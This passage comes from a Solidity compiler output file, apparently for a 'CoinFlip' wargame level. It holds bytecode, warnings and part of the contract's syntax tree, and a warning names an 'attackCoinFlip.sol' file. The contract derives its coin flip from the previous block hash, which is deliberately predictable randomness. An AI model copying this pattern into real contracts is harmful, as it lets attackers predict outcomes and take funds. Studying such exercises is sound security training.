							"opcodes": "PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SELFDESTRUCT 0xE9 0xA8 0xE8 SLT SELFDESTRUCT 0xEA COINBASE SWAP5 SWAP7 0xBC EXTCODEHASH PUSH1 0xB9 0xAF ADD 0x2C PUSH19 0x735514B8FA17C90550EA5480DEDD64736F6C63 NUMBER STOP ADDMOD 0xD STOP CALLER ",
							"sourceMap": "482:6511:2:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220ffe9a8e812ffea419496bc3f60b9af012c72735514b8fa17c90550ea5480dedd64736f6c634300080d0033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SELFDESTRUCT 0xE9 0xA8 0xE8 SLT SELFDESTRUCT 0xEA COINBASE SWAP5 SWAP7 0xBC EXTCODEHASH PUSH1 0xB9 0xAF ADD 0x2C PUSH19 0x735514B8FA17C90550EA5480DEDD64736F6C63 NUMBER STOP ADDMOD 0xD STOP CALLER ",
							"sourceMap": "482:6511:2:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
								"div(uint256,uint256,string memory)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mod(uint256,uint256,string memory)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite",
								"sub(uint256,uint256,string memory)": "infinite",
								"tryAdd(uint256,uint256)": "infinite",
								"tryDiv(uint256,uint256)": "infinite",
								"tryMod(uint256,uint256)": "infinite",
								"tryMul(uint256,uint256)": "infinite",
								"trySub(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH #[$]",
									"source": 2,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH [$]",
									"source": 2,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "B"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "CODECOPY",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "BYTE",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "73"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "1"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "MSTORE",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "4"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "MSTORE",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "24"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "tag",
									"source": 2,
									"value": "1"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "ADDRESS",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "MSTORE",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "PUSH",
									"source": 2,
									"value": "73"
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "MSTORE8",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 482,
									"end": 6993,
									"name": "RETURN",
									"source": 2
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220ffe9a8e812ffea419496bc3f60b9af012c72735514b8fa17c90550ea5480dedd64736f6c634300080d0033",
									".code": [
										{
											"begin": 482,
											"end": 6993,
											"name": "PUSHDEPLOYADDRESS",
											"source": 2
										},
										{
											"begin": 482,
											"end": 6993,
											"name": "ADDRESS",
											"source": 2
										},
										{
											"begin": 482,
											"end": 6993,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 482,
											"end": 6993,
											"name": "PUSH",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 482,
											"end": 6993,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 482,
											"end": 6993,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 482,
											"end": 6993,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 482,
											"end": 6993,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 482,
											"end": 6993,
											"name": "REVERT",
											"source": 2
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.13+commit.abaa5c0e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations. NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler now has built in overflow checking.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"Fallback/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"Fallback/SafeMath.sol\":{\"keccak256\":\"0x46eb1d4c81eed2dd868bc0a1b411e0c7a70cb9ecde086a58aee97e97134e27a4\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://87db288de7f3ebb5d38bcb26b123b7e1e14d43b5527cbad22e75337baa7b8f6f\",\"dweb:/ipfs/QmZ7ALuXLEoexu1uVqrve6kXMqkHzvL3qf7BMtdoLEA2vA\"]}},\"version\":1}",
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n--> CoinFlip/CoinFlip.sol\n\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "CoinFlip/CoinFlip.sol",
					"start": -1
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n--> CoinFlip/attackCoinFlip.sol\n\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "CoinFlip/attackCoinFlip.sol",
					"start": -1
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "2462",
				"formattedMessage": "Warning: Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.\n  --> CoinFlip/CoinFlip.sol:12:3:\n   |\n12 |   constructor() public {\n   |   ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.",
				"severity": "warning",
				"sourceLocation": {
					"end": 331,
					"file": "CoinFlip/CoinFlip.sol",
					"start": 278
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "6321",
				"formattedMessage": "Warning: Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.\n --> CoinFlip/attackCoinFlip.sol:9:57:\n  |\n9 |     function guessTheCurrentBlockValue() public returns(uint256){\n  |                                                         ^^^^^^^\n\n",
				"message": "Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.",
				"severity": "warning",
				"sourceLocation": {
					"end": 273,
					"file": "CoinFlip/attackCoinFlip.sol",
					"start": 266
				},
				"type": "Warning"
			}
		],
		"sources": {
			"CoinFlip/CoinFlip.sol": {
				"ast": {
					"absolutePath": "CoinFlip/CoinFlip.sol",
					"exportedSymbols": {
						"CoinFlip": [
							87
						],
						"SafeMath": [
							467
						]
					},
					"id": 88,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:0"
						},
						{
							"absolutePath": "Fallback/SafeMath.sol",
							"file": "../Fallback/SafeMath.sol",
							"id": 2,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 88,
							"sourceUnit": 468,
							"src": "27:34:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "CoinFlip",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 87,
							"linearizedBaseContracts": [
								87
							],
							"name": "CoinFlip",
							"nameLocation": "74:8:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"global": false,
									"id": 5,
									"libraryName": {
										"id": 3,
										"name": "SafeMath",
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 467,
										"src": "96:8:0"
									},
									"nodeType": "UsingForDirective",
									"src": "90:27:0",
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "109:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"functionSelector": "e6f334d7",
									"id": 7,
									"mutability": "mutable",
									"name": "consecutiveWins",
									"nameLocation": "136:15:0",
									"nodeType": "VariableDeclaration",
									"scope": 87,
									"src": "121:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "121:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 9,
									"mutability": "mutable",
									"name": "lastHash",
									"nameLocation": "164:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 87,
									"src": "156:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 8,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "156:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 12,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "185:6:0",
									"nodeType": "VariableDeclaration",
									"scope": 87,
									"src": "177:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 10,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "177:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 11,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "194:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 19,
										"nodeType": "Block",
										"src": "299:32:0",
										"statements": [
											{
												"expression": {
													"id": 17,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 15,
														"name": "consecutiveWins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 7,
														"src": "306:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "30",
														"id": 16,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "324:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "306:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 18,
												"nodeType": "ExpressionStatement",
												"src": "306:19:0"
											}
										]
									},
									"id": 20,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "289:2:0"
									},
									"returnParameters": {
										"id": 14,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "299:0:0"
									},
									"scope": 87,
									"src": "278:53:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 85,
										"nodeType": "Block",
										"src": "386:404:0",
										"statements": [
											{
												"assignments": [
													28
												],
												"declarations": [
													{
														"constant": false,
														"id": 28,
														"mutability": "mutable",
														"name": "blockValue",
														"nameLocation": "401:10:0",
														"nodeType": "VariableDeclaration",
														"scope": 85,
														"src": "393:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 27,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "393:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 39,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"hexValue": "31",
																			"id": 35,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "449:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			}
																		],
																		"expression": {
																			"expression": {
																				"id": 32,
																				"name": "block",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 4294967292,
																				"src": "432:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_block",
																					"typeString": "block"
																				}
																			},
																			"id": 33,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "number",
																			"nodeType": "MemberAccess",
																			"src": "432:12:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 34,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 346,
																		"src": "432:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 36,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "432:19:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 31,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "422:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 37,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "422:30:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 30,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "414:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 29,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "414:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 38,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "414:39:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "393:60:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 42,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 40,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 9,
														"src": "466:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 41,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 28,
														"src": "478:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "466:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 47,
												"nodeType": "IfStatement",
												"src": "462:53:0",
												"trueBody": {
													"id": 46,
													"nodeType": "Block",
													"src": "490:25:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 43,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "499:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 44,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "499:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 45,
															"nodeType": "ExpressionStatement",
															"src": "499:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 50,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 48,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 9,
														"src": "523:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 49,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 28,
														"src": "534:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "523:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 51,
												"nodeType": "ExpressionStatement",
												"src": "523:21:0"
											},
											{
												"assignments": [
													53
												],
												"declarations": [
													{
														"constant": false,
														"id": 53,
														"mutability": "mutable",
														"name": "coinFlip",
														"nameLocation": "559:8:0",
														"nodeType": "VariableDeclaration",
														"scope": 85,
														"src": "551:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 52,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "551:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 58,
												"initialValue": {
													"arguments": [
														{
															"id": 56,
															"name": "FACTOR",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 12,
															"src": "585:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"id": 54,
															"name": "blockValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 28,
															"src": "570:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 55,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "div",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 376,
														"src": "570:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 57,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "570:22:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "551:41:0"
											},
											{
												"assignments": [
													60
												],
												"declarations": [
													{
														"constant": false,
														"id": 60,
														"mutability": "mutable",
														"name": "side",
														"nameLocation": "604:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 85,
														"src": "599:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 59,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "599:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 67,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 63,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 61,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 53,
															"src": "611:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 62,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "623:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "611:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 65,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "634:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 66,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "611:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 64,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "627:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "599:40:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 70,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 68,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 60,
														"src": "652:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 69,
														"name": "_guess",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 22,
														"src": "660:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "652:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 83,
													"nodeType": "Block",
													"src": "728:57:0",
													"statements": [
														{
															"expression": {
																"id": 79,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 77,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "737:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"hexValue": "30",
																	"id": 78,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
